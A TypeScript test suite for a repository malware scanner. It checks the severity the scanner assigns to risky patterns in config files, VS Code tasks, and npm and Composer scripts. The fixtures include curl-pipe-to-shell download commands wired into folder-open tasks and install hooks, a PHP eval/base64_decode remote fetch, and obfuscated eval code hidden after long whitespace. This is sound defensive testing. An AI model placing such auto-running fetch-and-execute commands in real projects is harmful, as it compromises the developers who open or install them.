import assert from "node:assert/strict";
import test from "node:test";
import { analyzeFile } from "../src/scanner/analyzer";
import { KNOWN_INDICATORS } from "../src/scanner/indicators";

const bytes = (text: string): Uint8Array => new TextEncoder().encode(text);

test("a process import alone is review, not a malware verdict", () => {
  const result = analyzeFile({ relativePath: "src/worker.ts", bytes: bytes("import { exec } from 'child_process';\n") });
  const heuristic = result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION");
  assert.equal(heuristic?.severity, "review");
});

test("ordinary functions, URLs, and application fetch calls are not findings by themselves", () => {
  for (const source of [
    "export default function (data) { return data; }",
    "export const docs = 'https://example.invalid/reference';",
    "export async function load() { return fetch('/api/profile'); }"
  ]) {
    const result = analyzeFile({ relativePath: "src/application.ts", bytes: bytes(source) });
    assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION"), undefined);
  }
});

test("embedded base64 media is not treated as an encoded payload", () => {
  const media = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".repeat(220);
  const source = `// https://example.invalid/asset-docs\nexport const icon = "data:image/png;base64,${media}";`;
  const result = analyzeFile({ relativePath: "src/icon.tsx", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION"), undefined);
});

test("declarative Semgrep rules can quote dangerous APIs without becoming findings", () => {
  const source = "rules:\n  - id: no-process\n    pattern-regex: '(child_process|Function\\()'";
  const result = analyzeFile({ relativePath: ".semgrep.yml", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION"), undefined);
});

test("the case-sensitive Function constructor remains a dynamic execution signal", () => {
  const result = analyzeFile({ relativePath: "src/worker.ts", bytes: bytes("const run = Function('return 1');") });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION")?.severity, "review");
});

test("an active network command in executable configuration remains High", () => {
  const result = analyzeFile({ relativePath: ".github/workflows/upload.yml", bytes: bytes("run: curl https://example.invalid/upload") });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION")?.severity, "high");
});

test("known incident indicators are immediately Critical", () => {
  const indicator = KNOWN_INDICATORS[3];
  const result = analyzeFile({ relativePath: "postcss.config.mjs", bytes: bytes(`export default {}; const host = '${indicator.value}';`) });
  assert.equal(result.findings.find(item => item.ruleId === indicator.id)?.severity, "critical");
});

test("obfuscation, execution, network, encoding and config context combine to Critical", () => {
  const names = Array.from({ length: 12 }, (_, index) => `_0x${(4096 + index).toString(16)}`).join(";");
  const blob = "QWxhZGRpbjpvcGVuIHNlc2FtZQ".repeat(20);
  const padding = "x".repeat(12500);
  const source = `export default {};${names};eval(Buffer.from('${blob}','base64'));fetch('https://example.invalid');/*${padding}*/`;
  const result = analyzeFile({ relativePath: "postcss.config.mjs", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION")?.severity, "critical");
});

test("hidden code after config whitespace is Critical", () => {
  const source = `export default {};${" ".repeat(1400)}const payload = eval('x')`;
  const result = analyzeFile({ relativePath: "vite.config.ts", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-CONFIG-HIDDEN-APPEND")?.severity, "critical");
});

test("a normal folder-open task is High even when its command is harmless", () => {
  const source = JSON.stringify({ version: "2.0.0", tasks: [{ label: "prepare", type: "shell", command: "echo ready", runOptions: { runOn: "folderOpen" } }] });
  const result = analyzeFile({ relativePath: ".vscode/tasks.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-FOLDER-OPEN")?.severity, "high");
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-AUTOEXEC"), undefined);
});

test("a JSONC folder-open download and shell chain is Critical", () => {
  const source = `{
    // This comment and trailing comma are valid in VS Code configuration.
    "tasks": [{
      "label": "prepare",
      "command": "curl",
      "args": ["https://example.invalid/payload", "|", "sh"],
      "runOptions": { "runOn": "folderOpen" },
    }],
  }`;
  const result = analyzeFile({ relativePath: ".vscode/tasks.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-AUTOEXEC")?.severity, "critical");
});

test("JSONC parsing preserves comma and brace text inside task arguments", () => {
  const source = `{
    "tasks": [{
      "label": "format",
      "command": "echo",
      "args": [",}", "ready"],
      "runOptions": { "runOn": "folderOpen" },
    }],
  }`;
  const result = analyzeFile({ relativePath: ".vscode/tasks.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-FOLDER-OPEN")?.severity, "high");
});

test("folder-open tasks resolve dangerous dependsOn commands", () => {
  const source = JSON.stringify({ tasks: [
    { label: "download", command: "curl https://example.invalid/payload | sh" },
    { label: "prepare", command: "echo ready", dependsOn: "download", runOptions: { runOn: "folderOpen" } }
  ] });
  const result = analyzeFile({ relativePath: ".vscode/tasks.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-AUTOEXEC")?.severity, "critical");
});

test("workspace automatic-task permission is High", () => {
  const source = `{
    "task.allowAutomaticTasks": "on",
  }`;
  const result = analyzeFile({ relativePath: ".vscode/settings.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-AUTOTASK-ON")?.severity, "high");
});

test("combined word-wrap and minimap concealment settings are High", () => {
  const source = JSON.stringify({ "editor.wordWrap": "off", "editor.minimap.enabled": false });
  const result = analyzeFile({ relativePath: ".vscode/settings.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-CONCEALMENT")?.severity, "high");
});

test("extreme task indentation is reported as concealment", () => {
  const source = `{\n${" ".repeat(300)}"label": "hidden"\n}`;
  const result = analyzeFile({ relativePath: ".vscode/tasks.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-VSCODE-CONCEALMENT")?.severity, "high");
});

test("dangerous npm lifecycle command is Critical", () => {
  const source = JSON.stringify({ scripts: { postinstall: "curl https://example.invalid/a | sh" } });
  const result = analyzeFile({ relativePath: "package.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-NPM-LIFECYCLE")?.severity, "critical");
});

test("ordinary npm lifecycle tooling is Review rather than High", () => {
  const source = JSON.stringify({ scripts: { prepare: "husky" } });
  const result = analyzeFile({ relativePath: "package.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-NPM-LIFECYCLE")?.severity, "review");
});

test("non-registry dependencies are Review", () => {
  const source = JSON.stringify({ dependencies: { demo: "git+ssh://example.invalid/demo.git" } });
  const result = analyzeFile({ relativePath: "package.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-NPM-NONREGISTRY")?.severity, "review");
});

test("automatic Composer scripts are reviewed", () => {
  const source = JSON.stringify({ scripts: { "post-install-cmd": ["@php artisan package:discover"] } });
  const result = analyzeFile({ relativePath: "composer.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-COMPOSER-SCRIPT")?.severity, "review");
});

test("dangerous Composer scripts are Critical", () => {
  const source = JSON.stringify({ scripts: { "post-install-cmd": "curl https://example.invalid/install | sh" } });
  const result = analyzeFile({ relativePath: "composer.json", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-COMPOSER-SCRIPT")?.severity, "critical");
});

test("PHP execution, download, and decoding in Laravel config is Critical", () => {
  const source = "eval(base64_decode(file_get_contents('https://example.invalid/payload')));";
  const result = analyzeFile({ relativePath: "config/app.php", bytes: bytes(source) });
  assert.equal(result.findings.find(item => item.ruleId === "FG-HEUR-COMBINATION")?.severity, "critical");
});

test("potentially unignored env files are carefully worded Review findings", () => {
  const result = analyzeFile({ relativePath: ".env", bytes: bytes("TOKEN=example"), envPotentiallyUnignored: true });
  const finding = result.findings.find(item => item.ruleId === "FG-ENV-EXPOSURE");
  assert.equal(finding?.severity, "review");
  assert.match(finding?.description ?? "", /Verify with Git/);
});

test("binary content is skipped without decoding", () => {
  const result = analyzeFile({ relativePath: "asset.bin", bytes: new Uint8Array([1, 2, 0, 4]) });
  assert.equal(result.binary, true);
  assert.deepEqual(result.findings, []);
});

test("fingerprint changes when file content changes", () => {
  const first = analyzeFile({ relativePath: "x.js", bytes: bytes("eval('a')") }).findings[0];
  const second = analyzeFile({ relativePath: "x.js", bytes: bytes("eval('b')") }).findings[0];
  assert.notEqual(first.fingerprint, second.fingerprint);
});
